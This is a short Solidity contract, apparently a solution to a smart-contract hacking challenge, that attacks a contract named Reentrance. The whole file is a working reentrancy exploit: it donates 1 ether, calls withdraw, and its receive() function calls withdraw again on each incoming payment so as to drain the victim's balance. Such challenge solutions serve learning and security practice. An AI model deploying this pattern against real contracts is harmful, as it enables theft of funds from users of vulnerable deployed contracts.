// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract Solution9 {
    Reentrance public victim;

    constructor(Reentrance victim_) public {
        victim = victim_;
    }

    function attack() external payable {
        victim.donate{value:1 ether}(address(this));
        victim.withdraw(1 ether);
    }

    //We need this to be able to handle payable(owner).transfer(address(this).balance);
    receive() external payable {
        victim.withdraw(1 ether);
    }
}
